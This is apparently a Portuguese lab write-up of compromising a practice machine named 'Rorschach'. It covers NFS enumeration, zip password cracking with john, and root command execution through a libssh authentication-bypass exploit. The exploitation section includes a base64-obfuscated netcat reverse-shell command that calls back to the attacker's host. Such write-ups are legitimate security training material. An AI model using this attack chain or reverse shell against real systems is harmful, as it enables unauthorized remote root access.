EHPT - Rorschach

# EHPT - Rorschach

## Enumeração

### Scan inicial

- Iniciando a enumeração da máquina com nmap, encontrados os seguintes serviços em execução

```
# Nmap 7.80 scan initiated Fri Jun 19 18:27:13 2020 as: nmap -A -p22,111,2049,8140,41191,44285,45397,51707 -Pn -oA full 10.0.0.9

Nmap scan report for 10.0.0.9
Host is up (0.0012s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:bb:45:9e:3a:22:86:57:cf:04:95:ec:9e:3a:c9:83 (RSA)
|   256 3d:28:98:10:45:40:4a:82:f8:63:d7:19:38:3e:d9:17 (ECDSA)
|_  256 d6:26:94:02:47:50:6c:d6:b4:63:eb:c8:63:a6:14:ad (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36931/udp   mountd
|   100005  1,2,3      45397/tcp   mountd
|   100005  1,2,3      56071/tcp6  mountd
|   100005  1,2,3      56489/udp6  mountd
|   100021  1,3,4      42316/udp6  nlockmgr
|   100021  1,3,4      42643/tcp6  nlockmgr
|   100021  1,3,4      44285/tcp   nlockmgr
|   100021  1,3,4      49923/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8140/tcp  open  ssh      libssh 0.8.3 (protocol 2.0)
| ssh-hostkey: 
|_  2048 95:4f:0d:77:af:d0:f4:94:81:43:3f:c0:2c:d3:a3:fe (RSA)
41191/tcp open  mountd   1-3 (RPC #100005)
44285/tcp open  nlockmgr 1-4 (RPC #100021)
45397/tcp open  mountd   1-3 (RPC #100005)
51707/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jun 19 18:27:20 2020 -- 1 IP address (1 host up) scanned in 6.62 seconds
```

### 2049/TCP - NFS

- Uma vez que foi notado um serviço de nfs na porta 2049/TCP, inciado a enumeração do mesmo através do comando showmount, que mostra que o mesmo é publicamente acessível

```
dcruz@kali:/dcruz/ehpt/rorschach/scan$ showmount -e 10.0.0.9
Export list for 10.0.0.9:
/media/nfs *
```

- Realizado o ponto de montagem do diretório e encontrados os seguintes arquivos no mesmo

```
dcruz@kali:/dcruz/ehpt/rorschach$ mkdir mount
dcruz@kali:/dcruz/ehpt/rorschach$ sudo mount -t nfs 10.0.0.9:/media/nfs /dcruz/ehpt/rorschach/mount/
dcruz@kali:/dcruz/ehpt/rorschach$ cd mount/
dcruz@kali:/dcruz/ehpt/rorschach/mount$ tree
.
├── index.html
└── secret.pdf.zip

0 directories, 2 files
dcruz@kali:/dcruz/ehpt/rorschach/mount$ ls -la
total 168
drwxr-xr-x 2 root  root   4096 Feb  4 13:07 .
drwxr-xr-x 6 dcruz dcruz  4096 Jun 19 18:38 ..
-rw-r--r-- 1 root  root  79931 Feb  4 13:07 index.html
-rw-r--r-- 1 root  root  79931 Jan 29 00:55 secret.pdf.zip
```

- Uma vez que ambos os arquivos tem a mesma quantidade de bytes, executado o file em abos e visto que são o mesmo arquivo, o que pode ser tambem comprovado com o comando sha1sum

```
dcruz@kali:/dcruz/ehpt/rorschach/mount$ file index.html 
index.html: Zip archive data, at least v?[0x333] to extract
dcruz@kali:/dcruz/ehpt/rorschach/mount$ file secret.pdf.zip 
secret.pdf.zip: Zip archive data, at least v?[0x333] to extract
dcruz@kali:/dcruz/ehpt/rorschach/mount$ cat index.html | shasum 
be678da6d06a027e2b6478cd8117c5cd8e094152  -
dcruz@kali:/dcruz/ehpt/rorschach/mount$ cat secret.pdf.zip | shasum 
be678da6d06a027e2b6478cd8117c5cd8e094152  -
dcruz@kali:/dcruz/ehpt/rorschach/mount$ 

```

- Copiado arquivo para pasta loot, o qual ao tentar extrair, solicitou password

```
dcruz@kali:/dcruz/ehpt/rorschach/loot$ 7z x secret.pdf.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 79931 bytes (79 KiB)

Extracting archive: secret.pdf.zip
--
Path = secret.pdf.zip
Type = zip
Physical Size = 79931

Enter password (will not be echoed):
```

- Utilizado zip2john e john para quebrar a senha do arquivo zip, com o dicionário rockyou.txt

```
dcruz@kali:/dcruz/ehpt/rorschach/loot$ zip2john secret.pdf.zip > zip.hash
dcruz@kali:/dcruz/ehpt/rorschach/loot$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
paradise!        (secret.pdf.zip/secret.pdf)
1g 0:00:00:10 DONE (2020-06-19 18:55) 0.09398g/s 37341p/s 37341c/s 37341C/s remmer..ozzie7
Use the "--show" option to display all of the cracked passwords reliably
Session completed
dcruz@kali:/dcruz/ehpt/rorschach/loot$ john zip.hash --show
secret.pdf.zip/secret.pdf:paradise!:secret.pdf:secret.pdf.zip:secret.pdf.zip

1 password hash cracked, 0 left

```

- Usando a senha **paradise!** conforme imagem acima foi possível extrair o arquivo secret.pdf, porem o mesmo continha apenas uma imagem, conforme screenshot abaixo.

![image-20200619185925236](C:\Temp\EHPT\.assets\image-20200619185925236.png)

- Analisando rapidamente as strings do arquivo, não foi encontrado nada no mesmo.

### 8140/TCP - LibSSH

- Retomando a enumeração dos serviços na maquina, identificado que na porta 8140/TCP existe um serviço SSH executando a libssh 0.8.3. Rapidamente buscando no searchsploit esta biblioteca, identificado que esta se trata de uma versão vulnerável a acesso não autorizado

```
dcruz@kali:/dcruz/ehpt/rorschach/loot$ searchsploit libssh
--------------------------------------------------------- ---------------------------------
Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
libSSH - Authentication Bypass                           | linux/remote/45638.py
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access               | linux/remote/46307.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## Exploração

- Verificando o segundo exploit (**46307**) identificado que este permite a execução de um comando informando como argumentos ao script o hostname, porta e comando desejado. Ao executar com os dados desejados, notado que já é possivel obter um shell como root nesta maquina :)

```
dcruz@kali:/dcruz/ehpt/rorschach/exploit$ ./46307.py 10.0.0.9 8140 id
/home/dcruz/.local/lib/python3.8/site-packages/paramiko/rsakey.py:127: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.
verifier = key.verifier(
uid=0(root) gid=0(root) groups=0(root)
```

- Uma vez que temos execução remota de código como root, executados os comandos necessários para obter um shell reverso para que pudéssemos obter a flag.

```
dcruz@kali:/dcruz/ehpt/rorschach/exploit$ ./46307.py 10.0.0.9 8140 "echo -n 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI│
+JjF8bmMgMTAuMC4wLjMgNDQ0MyA+L3RtcC9mCg==' | base64 -d | bash"  
```

- Como Root, obtido flag na maquina

```
# cat .root.txt
b077bffcb1ef246f7cc77ae2a86bc684
```

- Uma vez que se tem root na maquina, obtido os demais flags existentes na máquina

```
root@debian:/# find / 2> /dev/null | grep .txt$
[....]
/home/noob/local.txt
/home/sandman/user.txt
root@debian:/# cat /home/noob/local.txt
cat /home/noob/local.txt
c7e9d46b43370b38f661b25166253d38
root@debian:/# cat /home/sandman/user.txt
cat /home/sandman/user.txt
536aec5f29a91b5ee5154b713f83c1b5
```